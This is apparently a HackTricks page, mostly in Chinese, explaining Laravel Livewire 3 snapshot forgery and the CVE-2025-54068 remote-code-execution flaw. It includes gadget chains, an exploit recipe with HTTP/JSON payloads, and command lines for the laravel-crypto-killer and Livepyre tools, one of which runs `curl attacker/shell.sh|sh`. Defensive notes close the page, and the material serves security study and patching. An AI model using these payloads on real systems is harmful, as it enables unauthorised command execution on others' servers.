# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Livewire 状态机回顾

Livewire 3 组件通过包含 `data`、`memo` 和校验和的 **snapshots** 交换它们的状态。每次对 `/livewire/update` 的 POST 都会在服务器端将 JSON snapshot 重新 hydrate（恢复），并执行排队的 `calls`/`updates`。
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
任何持有 `APP_KEY`（用于派生 `$hashKey`）的人因此可以通过重新计算 HMAC 来伪造任意快照。

复杂属性被编码为 **合成元组**，由 `Livewire\Drawer\BaseUtils::isSyntheticTuple()` 检测；每个元组为 `[value, {"s":"<key>", ...meta}]`。hydration 核心只是将每个元组委派给在 `HandleComponents::$propertySynthesizers` 中选定的 synth，并对其子项进行递归：
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
这种递归设计使 Livewire 成为一个**通用的对象实例化引擎**，一旦攻击者控制了元组 metadata 或在递归处理中处理的任何嵌套 tuple。

## Synthesizers that grant gadget primitives

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | 在对每个子项进行 rehydration 后实例化 `new $meta['class']($value)`。任何带数组构造函数的类都可以被创建，并且每个项本身也可能是一个 synthetic tuple。 
| **FormObjectSynth (`form`)** | 调用 `new $meta['class']($component, $path)`，然后通过 `$hydrateChild` 从攻击者控制的子项为每个 public 属性赋值。接受两个宽类型参数（或有默认参数）的构造函数就足以达到任意 public 属性。 
| **ModelSynth (`mdl`)** | 当 meta 中缺少 `key` 时它会执行 `return new $class;`，允许对攻击者控制的任何类进行零参数实例化。 

因为 synths 在每个嵌套元素上调用 `$hydrateChild`，可以通过递归堆叠 tuples 构建任意 gadget 图。

## Forging snapshots when `APP_KEY` is known

1. 捕获一个合法的 `/livewire/update` 请求并解码 `components[0].snapshot`。
2. 注入指向 gadget 类的嵌套 tuples，并重新计算 `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`。
3. 重新编码快照，保持 `_token`/`memo` 不变，然后重放该请求。

一个最小的执行证明使用 **Guzzle's `FnStream`** 和 **Flysystem's `ShardedPrefixPublicUrlGenerator`**。一个 tuple 用构造数据 `{ "__toString": "phpinfo" }` 实例化 `FnStream`，下一个 tuple 使用 `[FnStreamInstance]` 作为 `$prefixes` 实例化 `ShardedPrefixPublicUrlGenerator`。当 Flysystem 将每个 prefix 强制转换为 `string` 时，PHP 会调用攻击者提供的 `__toString` 可调用函数，从而调用任意不带参数的函数。

### From function calls to full RCE

利用 Livewire 的实例化原语，Synacktiv 改编了 phpggc 的 `Laravel/RCE4` 链，使得 hydration 引导的对象其 public Queueable 状态触发反序列化：

1. **Queueable trait** – 任何使用 `Illuminate\Bus\Queueable` 的对象都会暴露 public `$chained`，并在 `dispatchNextJobInChain()` 中执行 `unserialize(array_shift($this->chained))`。
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) 通过 `CollectionSynth` / `FormObjectSynth` 实例化，且 public `$chained` 被填充。
3. **phpggc Laravel/RCE4Adapted** – 存储在 `$chained[0]` 的序列化 blob 构建了 `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`。`Signed::__invoke()` 最终调用 `call_user_func_array($closure, $args)`，从而能够执行 `system($cmd)`。
4. **Stealth termination** – 通过提供第二个 `FnStream` 可调用，例如 `[new Laravel\Prompts\Terminal(), 'exit']`，请求会以 `exit()` 结束而不是产生嘈杂的异常，从而保持 HTTP 响应干净。

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer` 现在提供了一个 `livewire` 模式，将所有步骤拼接在一起：
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
该工具解析捕获的 snapshot，注入 gadget tuples，重新计算 checksum，并打印可直接发送的 `/livewire/update` payload。

## CVE-2025-54068 – RCE 无需 `APP_KEY`

根据厂商公告，该问题影响 Livewire v3 (>= 3.0.0-beta.1 and < 3.6.3)，且仅存在于 v3。

`updates` 会在 snapshot checksum 验证通过 **之后** 合并到组件状态。如果 snapshot 内的某个属性是（或变成）synthetic tuple，Livewire 在为攻击者控制的 update 值进行 hydration 时会重用其 meta：
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- Recursion plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes eventually reach hydration.

## Livepyre – 端到端利用

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- Fingerprints the deployed Livewire version by parsing `<script src="/livewire/livewire.js?id=HASH">` and mapping the hash to vulnerable releases.
- Collects baseline snapshots by replaying benign actions and extracting `components[].snapshot`.
- Generates either an `updates`-only payload (CVE-2025-54068) or a forged snapshot (known APP_KEY) embedding the phpggc chain.
- If no object-typed parameter is found in a snapshot, Livepyre falls back to brute-forcing candidate params to reach a coercible property.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` 运行非破坏性 probe，`-F` 跳过 version gating，`-H` 和 `-P` 添加自定义 headers 或 proxies，`--function/--param` 定制由 gadget chain 调用的 php 函数。

## 防御注意事项

- 升级到已修复的 Livewire 构建（根据厂商公告为 >= 3.6.4），并部署针对 CVE-2025-54068 的厂商补丁。
- 避免在 Livewire 组件中使用弱类型的 public properties；显式的 scalar types 可防止属性值被强制转换为 arrays/tuples。
- 仅注册你真正需要的 synthesizers，并将用户可控的 metadata (`$meta['class']`) 视为不可信。
- 拒绝会改变属性 JSON 类型（例如 scalar -> array）的更新，除非明确允许，并重新派生 synth metadata 而不是重用过期的 tuples。
- 在任何泄露后立即更换 `APP_KEY`，因为它使得离线 snapshot forging 成为可能，无论代码库如何修补。

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
